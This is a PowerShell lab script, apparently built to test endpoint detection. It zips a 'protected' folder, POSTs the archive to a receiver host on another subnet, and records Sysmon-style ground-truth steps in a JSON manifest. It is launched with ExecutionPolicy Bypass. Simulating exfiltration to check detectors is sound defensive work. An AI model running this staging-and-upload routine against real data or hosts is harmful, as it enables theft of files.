# Scenario W1 (harmless). Launch from cmd:  cmd /c powershell -ExecutionPolicy Bypass -File C:\Lab\scenarios\w1_stage.ps1
# Requires a receiver on the Linux VM:  python3 -m http.server 8080
$Target = if ($env:NEXUS_TARGET) { $env:NEXUS_TARGET } else { "192.168.10.10" }
$Port   = if ($env:NEXUS_PORT)   { [int]$env:NEXUS_PORT } else { 8080 }
New-Item -ItemType Directory -Force -Path C:\Lab\staging, C:\Lab\manifests | Out-Null
$now = { (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ") }
$man = [ordered]@{ scenario = "W1"; endpoint_id = "windows-vm-01"; start_utc = (& $now); root_pid = $PID;
                   root_binary = (Get-Process -Id $PID).Path; steps = @() }

# step 1: stage a file into the lab staging folder (Sysmon EID 11)
Compress-Archive -Path C:\Lab\protected\* -DestinationPath C:\Lab\staging\report.zip -Force
$man.steps += [ordered]@{ kind = "file"; path = "C:\Lab\staging\report.zip"; operation = "create"; t = (& $now) }
Start-Sleep -Seconds 3

# step 2: send it across the subnet boundary (Sysmon EID 3, Initiated=true)
$man.steps += [ordered]@{ kind = "connection"; protocol = "TCP"; dst_ip = $Target; dst_port = $Port; direction = "outbound"; t = (& $now) }
try { Invoke-WebRequest -Uri "http://$Target`:$Port/upload" -Method Post -InFile C:\Lab\staging\report.zip -UseBasicParsing -TimeoutSec 10 | Out-Null } catch { }

$man.end_utc = (& $now)
$path = "C:\Lab\manifests\W1-" + ($man.start_utc -replace ":", "") + ".json"
$man | ConvertTo-Json -Depth 5 | Set-Content -Path $path -Encoding UTF8
Write-Host "manifest: $path"
